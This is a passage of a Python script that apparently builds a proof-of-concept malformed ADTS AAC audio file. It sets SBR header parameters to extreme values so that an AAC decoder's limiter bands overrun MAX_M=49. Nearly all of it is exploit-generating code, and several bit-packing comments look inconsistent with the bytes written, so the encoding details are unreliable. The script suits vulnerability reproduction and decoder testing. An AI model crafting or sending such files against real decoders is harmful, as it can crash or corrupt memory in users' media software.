ngth >> 11) & 0x03)\n    \n    # Byte 4: FrameLength middle 8 bits\n    byte4 = (frame_length >> 3) & 0xFF\n    \n    # Byte 5: FrameLength low 3 bits + BufferFullness high 5 bits\n    byte5 = ((frame_length & 0x07) << 5) | 0x1F\n    \n    # Byte 6: BufferFullness low 6 bits + NumFrames(0)\n    byte6 = 0xFC\n    \n    return bytes([byte0, byte1, byte2, byte3, byte4, byte5, byte6])\n\n\ndef make_sbr_extension_data():\n    """\n    Create SBR extension data with malicious parameters.\n    \n    The goal is to set SBR header parameters such that:\n    - bs_start_freq is high (to maximize frequency range)\n    - bs_stop_freq is high (to maximize M)\n    - This will cause limiter bands to exceed MAX_M=49\n    \n    SBR header structure (simplified):\n    - bs_amp_res: 1 bit\n    - bs_start_freq: 4 bits (0-15, higher = higher start frequency)\n    - bs_stop_freq: 4 bits (0-15, higher = higher stop frequency)\n    - bs_xover_band: 3 bits\n    - bs_reserved: 2 bits\n    - bs_header_extra_1: 1 bit\n    - bs_header_extra_2: 1 bit\n    """\n    \n    # Create a bitstream with malicious SBR parameters\n    # Set bs_start_freq = 15 (maximum) and bs_stop_freq = 15 (maximum)\n    # to create the largest possible frequency range\n    \n    data = bytearray()\n    \n    # SBR header with extreme values\n    # bs_amp_res = 1 (1 bit)\n    # bs_start_freq = 15 (4 bits) - maximum value\n    # bs_stop_freq = 15 (4 bits) - maximum value\n    # bs_xover_band = 7 (3 bits) - maximum value\n    # bs_reserved = 0 (2 bits)\n    # bs_header_extra_1 = 0 (1 bit)\n    # bs_header_extra_2 = 0 (1 bit)\n    \n    # Combine: 1|1111|1111|111|00|0|0 = 0b1111111111100000 = 0xFFE0\n    data.extend(struct.pack(\'>H\', 0xFFE0))\n    \n    # Add some envelope and noise data to make it process through HF adjustment\n    # bs_num_env = 1 (2 bits for FIXFIX frame class)\n    # We need to add envelope and noise floor data\n    \n    # Add padding/data to reach minimum frame size\n    data.extend(b\'\\x00\' * 100)\n    \n    return bytes(data)\n\n\ndef make_aac_frame_with_sbr():\n    """\n    Create an AAC frame with SBR extension.\n    \n    For HE-AAC (AAC + SBR), we need:\n    1. AAC core data (GASpecificConfig with SBR signaling)\n    2. SBR extension data\n    """\n    \n    frame_data = bytearray()\n    \n    # AAC core bitstream elements\n    # For stereo CPE (Channel Pair Element), we need:\n    # - ID_CPE (3 bits) = 0x1\n    # - element_instance_tag (4 bits) = 0\n    # - common_window (1 bit) = 1 (for SBR)\n    \n    # ID_CPE = 1, tag = 0, common_window = 1\n    # 0b001|0000|1 = 0x21\n    frame_data.append(0x21)\n    \n    # ICS info for CPE with common window\n    # - ics_reserved_bit (1 bit) = 0\n    # - window_sequence (2 bits) = 0 (ONLY_LONG_SEQUENCE)\n    # - window_shape (1 bit) = 0\n    # - max_sfb (6 bits) = 10\n    # - scale_factor_grouping (7 bits) = 0\n    # - predictor_data_present (1 bit) = 0\n    \n    # 0|00|0|001010 = 0x0A\n    frame_data.append(0x0A)\n    frame_data.append(0x00)  # scale_factor_grouping + predictor\n    \n    # ms_mask_present (2 bits) = 0\n    frame_data.append(0x00)\n    \n    # Add minimal spectral data for both channels\n    frame_data.extend(b\'\\x00\' * 50)\n    \n    # Add SBR extension element\n    # ID_FIL (3 bits) = 0x6\n    # count (4 bits) = 15 (indicates extended count follows)\n    # 0b110|1111 = 0xDF\n    frame_data.append(0xDF)\n    \n    # Extended count (8 bits) = length of extension payload\n    sbr_data = make_sbr_extension_data()\n    ext_len = len(sbr_data) + 2  # +2 for extension_type\n    frame_data.append(min(ext_len, 255))\n    \n    # extension_type (4 bits) = 13 (SBR_DATA)\n    # 0b1101 = 0xD\n    frame_data.append(0xD0)\n    \n    # Add SBR data\n    frame_data.extend(sbr_data)\n    \n    # ID_END (3 bits) = 0x7\n    frame_data.append(0xE0)  # 0b111|00000\n    \n    return bytes(frame_data)\n\n\ndef generate_testcase(output_path):\n    """Generate the malicious ADTS AAC file."""\n    \n    print(f"Genera